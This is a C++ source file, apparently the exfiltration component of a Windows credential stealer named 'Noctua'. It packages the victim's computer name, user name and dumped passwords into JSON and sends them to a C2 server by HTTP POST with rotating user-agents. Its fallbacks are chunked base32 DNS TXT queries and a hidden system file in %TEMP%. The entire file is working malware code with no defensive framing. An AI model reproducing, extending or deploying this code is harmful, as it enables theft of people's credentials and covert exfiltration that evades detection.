#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <ctime>
#include "dumper.h"
#include "obfuscate.h"
#include "config.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// -------------------------------------------------------------------
// JSON output helpers
// -------------------------------------------------------------------
namespace {

std::string EscapeJSON(const std::wstring& wstr) {
    std::string result;
    // Convert wstring to UTF-8
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len > 0) {
        result.resize(len - 1);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, nullptr, nullptr);
    }
    
    // Escape special characters
    std::string escaped;
    for (char c : result) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20)
                    escaped += '?';
                else
                    escaped += c;
        }
    }
    return escaped;
}

std::string GetTimestamp() {
    time_t now = time(nullptr);
    struct tm* t = gmtime(&now);
    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", t);
    return std::string(buf);
}

// User-agent rotation list
const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
};

const int NUM_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);

const char* GetRandomUserAgent() {
    srand(static_cast<unsigned>(GetTickCount() ^ time(nullptr)));
    int idx = rand() % NUM_AGENTS;
    return USER_AGENTS[idx];
}

} // anonymous namespace

// -------------------------------------------------------------------
// dump_to_json - Convert vector of DumpResults to JSON string
// -------------------------------------------------------------------
std::string dump_to_json(const std::vector<DumpResult>& results, 
                          const std::wstring& machineName = L"") {
    std::stringstream ss;
    
    ss << "{\n";
    ss << "  \"timestamp\": \"" << GetTimestamp() << "\",\n";
    
    // Get computer name
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD compLen = MAX_COMPUTERNAME_LENGTH + 1;
    std::string compNameStr = "unknown";
    if (GetComputerNameW(compName, &compLen)) {
        char buf[MAX_COMPUTERNAME_LENGTH + 1];
        WideCharToMultiByte(CP_UTF8, 0, compName, -1, buf, sizeof(buf), nullptr, nullptr);
        compNameStr = buf;
    }
    ss << "  \"computer_name\": \"" << EscapeJSON(compNameStr) << "\",\n";
    
    if (!machineName.empty()) {
        char buf[256];
        WideCharToMultiByte(CP_UTF8, 0, machineName.c_str(), -1, buf, sizeof(buf), nullptr, nullptr);
        ss << "  \"machine_name\": \"" << EscapeJSON(buf) << "\",\n";
    }
    
    // Get username
    wchar_t userName[256];
    DWORD userLen = 256;
    std::string userNameStr = "unknown";
    if (GetUserNameW(userName, &userLen)) {
        char buf[256];
        WideCharToMultiByte(CP_UTF8, 0, userName, -1, buf, sizeof(buf), nullptr, nullptr);
        userNameStr = buf;
    }
    ss << "  \"username\": \"" << EscapeJSON(userNameStr) << "\",\n";
    
    ss << "  \"credentials\": [\n";
    
    for (size_t i = 0; i < results.size(); ++i) {
        const auto& r = results[i];
        
        ss << "    {\n";
        ss << "      \"target\": \"" << EscapeJSON(r.target) << "\",\n";
        ss << "      \"username\": \"" << EscapeJSON(r.username) << "\",\n";
        ss << "      \"password\": \"" << EscapeJSON(r.password) << "\",\n";
        ss << "      \"url\": \"" << EscapeJSON(r.url) << "\",\n";
        ss << "      \"notes\": \"" << EscapeJSON(r.notes) << "\"\n";
        
        if (i < results.size() - 1)
            ss << "    },\n";
        else
            ss << "    }\n";
    }
    
    ss << "  ]\n";
    ss << "}\n";
    
    return ss.str();
}

// -------------------------------------------------------------------
// exfil_http - Send data via HTTP POST to C2 server
// Returns true on success
// -------------------------------------------------------------------
bool exfil_http(const std::string& jsonData, 
                const std::string& host = "127.0.0.1",
                int port = 5000,
                const std::string& endpoint = "/api/collect") {
    
    HINTERNET hInternet = InternetOpenA(
        GetRandomUserAgent(),
        INTERNET_OPEN_TYPE_PRECONFIG,
        nullptr, nullptr, 0
    );
    
    if (!hInternet) return false;
    
    // Build URL
    std::string url = "http://" + host + ":" + std::to_string(port) + endpoint;
    
    HINTERNET hConnect = InternetOpenUrlA(
        hInternet,
        url.c_str(),
        nullptr, 0,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
        0
    );
    
    // For a POST, we use HttpOpenRequest/HttpSendRequest
    // First get the host and resource parts
    std::string resource = endpoint;
    
    HINTERNET hHttpSession = InternetConnectA(
        hInternet,
        host.c_str(),
        static_cast<INTERNET_PORT>(port),
        nullptr, nullptr,
        INTERNET_SERVICE_HTTP,
        0, 0
    );
    
    if (!hHttpSession) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(
        hHttpSession,
        "POST",
        resource.c_str(),
        "HTTP/1.1",
        nullptr, nullptr,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
        0
    );
    
    if (!hRequest) {
        InternetCloseHandle(hHttpSession);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Headers
    const char* headers = 
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "X-Noctua-Collector: agent/1.0\r\n";
    
    BOOL sent = HttpSendRequestA(
        hRequest,
        headers,
        -1L,
        (LPVOID)jsonData.c_str(),
        static_cast<DWORD>(jsonData.length())
    );
    
    bool success = (sent == TRUE);
    
    // Read response (optional)
    if (success) {
        char respBuf[1024];
        DWORD bytesRead = 0;
        // Just consume the response
        while (InternetReadFile(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead) && bytesRead > 0) {}
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hHttpSession);
    InternetCloseHandle(hInternet);
    
    return success;
}

// -------------------------------------------------------------------
// Base32 encoding for DNS exfiltration
// -------------------------------------------------------------------
static const char BASE32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

std::string base32_encode(const std::string& data) {
    std::string result;
    size_t buffer = 0;
    int bitsLeft = 0;
    
    for (unsigned char c : data) {
        buffer = (buffer << 8) | c;
        bitsLeft += 8;
        while (bitsLeft >= 5) {
            bitsLeft -= 5;
            result += BASE32[(buffer >> bitsLeft) & 0x1F];
        }
    }
    
    if (bitsLeft > 0) {
        buffer <<= (5 - bitsLeft);
        result += BASE32[buffer & 0x1F];
    }
    
    return result;
}

// -------------------------------------------------------------------
// exfil_dns - Exfiltrate data via DNS TXT queries
// Data is base32-encoded and split into chunks, each sent as a
// subdomain DNS query to the C2 server's DNS resolver
// Format: <chunk_id>.<data_encoded>.<c2_domain>
// -------------------------------------------------------------------
bool exfil_dns(const std::string& jsonData,
               const std::string& c2Domain = "127.0.0.1") {
    
    // Encode JSON as base32
    std::string encoded = base32_encode(jsonData);
    
    // Split into chunks
    size_t chunkSize = DNS_MAX_CHUNK_SIZE;
    size_t totalChunks = (encoded.length() + chunkSize - 1) / chunkSize;
    
    // Add chunk count prefix
    std::stringstream ss;
    ss << std::hex << totalChunks;
    std::string totalStr = ss.str();
    
    bool allSent = true;
    
    for (size_t i = 0; i < totalChunks; ++i) {
        std::string chunk = encoded.substr(i * chunkSize, chunkSize);
        
        // Build DNS query: chunk_id.chunk_data.domain
        std::stringstream query;
        query << std::hex << i << "." << chunk << "." << c2Domain;
        
        std::string dnsQuery = query.str();
        
        // Use nslookup or DnsQuery to send the query
        // We'll use DnsQuery_W for Windows
        DNS_STATUS status = DnsQuery_UTF8(
            dnsQuery.c_str(),
            DNS_TYPE_TEXT,
            DNS_QUERY_STANDARD,
            nullptr,
            nullptr,
            nullptr
        );
        
        if (status != ERROR_SUCCESS) {
            allSent = false;
        }
        
        // Small delay between chunks
        Sleep(100);
    }
    
    // Send termination signal
    std::string termQuery = "done." + totalStr + "." + c2Domain;
    DnsQuery_UTF8(termQuery.c_str(), DNS_TYPE_TEXT, 
                   DNS_QUERY_STANDARD, nullptr, nullptr, nullptr);
    
    return allSent;
}

// -------------------------------------------------------------------
// exfil_file - Save data to a file in %TEMP% with hidden attribute
// -------------------------------------------------------------------
bool exfil_file(const std::string& jsonData, 
                const std::wstring& filename = L"noctua_dump.dat") {
    
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath))
        return false;
    
    std::wstring filePath = std::wstring(tempPath) + L"\\" + filename;
    
    // Write data
    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED,
        nullptr
    );
    
    if (hFile == INVALID_HANDLE_VALUE)
        return false;
    
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, jsonData.c_str(), 
                         static_cast<DWORD>(jsonData.length()), 
                         &written, nullptr);
    
    CloseHandle(hFile);
    
    if (!ok || written != jsonData.length()) {
        DeleteFileW(filePath.c_str());
        return false;
    }
    
    return true;
}

// -------------------------------------------------------------------
// Main exfiltration dispatcher
// Reads config to determine method and sends data accordingly
// -------------------------------------------------------------------
bool exfil_dispatch(const std::vector<DumpResult>& results) {
    std::string jsonData = dump_to_json(results);
    
    if (jsonData.empty() || jsonData == "{}")
        return false;
    
    // Try HTTP first (primary method)
    bool success = exfil_http(jsonData, C2_HOST, std::stoi(C2_PORT));
    
    // Fallback to file if HTTP fails
    if (!success) {
        success = exfil_file(jsonData);
    }
    
    // Try DNS as secondary fallback
    if (!success) {
        success = exfil_dns(jsonData, C2_HOST);
    }
    
    return success;
}
